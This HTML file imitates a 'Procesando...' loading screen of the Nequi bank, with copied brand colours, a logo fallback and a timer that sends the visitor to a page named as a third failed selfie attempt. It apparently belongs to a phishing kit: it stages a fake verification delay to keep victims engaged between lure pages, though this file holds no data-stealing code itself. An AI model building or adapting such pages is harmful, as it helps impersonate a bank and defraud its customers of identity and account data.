<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Procesando...</title>
<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: 'Manrope', -apple-system, BlinkMacSystemFont, sans-serif;
    -webkit-tap-highlight-color: transparent;
  }

  body {
    background-color: #ffffff;
    color: #200020;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    overflow: hidden;
  }

  .app-container {
    width: 100%;
    max-width: 420px;
    height: 100vh;
    max-height: 900px;
    padding: 40px 24px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    align-items: center;
    position: relative;
    background: #ffffff;
  }

  /* Logo Header */
  .header {
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-top: 10px;
  }

  .header img {
    height: 36px;
    object-fit: contain;
  }

  .logo-fallback {
    display: flex;
    align-items: center;
    font-size: 32px;
    font-weight: 800;
    color: #20002b;
    letter-spacing: -1px;
  }

  .logo-fallback::before {
    content: '';
    display: inline-block;
    width: 9px;
    height: 9px;
    background-color: #e6007e;
    margin-right: 4px;
    align-self: flex-start;
    margin-top: 6px;
  }

  /* Contenido central (Spinner y texto Procesando...) */
  .center-content {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 24px;
    margin: auto;
  }

  /* Círculo giratorio de carga estilo Nequi */
  .spinner {
    width: 50px;
    height: 50px;
    border: 4px solid #fce7f3; /* Rosa muy claro de fondo */
    border-top: 4px solid #e6007e; /* Color fucsia Nequi activo */
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  /* Texto Procesando... */
  .processing-text {
    font-size: 20px;
    font-weight: 700;
    color: #1e002c;
    letter-spacing: -0.2px;
  }

  /* Espaciador inferior invisible para mantener simetría vertical exacta */
  .footer-spacer {
    height: 36px;
  }
</style>
</head>
<body>

  <div class="app-container">
    
    <!-- Header -->
    <div class="header">
      <img src="vOLtQz8.png" alt="Nequi" onerror="this.style.display='none'; document.getElementById('alt-logo').style.display='flex';">
      <div id="alt-logo" class="logo-fallback" style="display: none;">Nequi</div>
    </div>

    <!-- Contenido central -->
    <div class="center-content">
      <div class="spinner"></div>
      <div class="processing-text">Procesando...</div>
    </div>

    <!-- Espaciador para equilibrar el diseño con el header -->
    <div class="footer-spacer"></div>

  </div>

  <script>
    // Redirige automáticamente después de 3 segundos (puedes cambiar el archivo de destino según necesites)
    setTimeout(() => {
      window.location.href = 'error_selfie_3_intentos.html';
    }, 4000);
  </script>

</body>
</html>
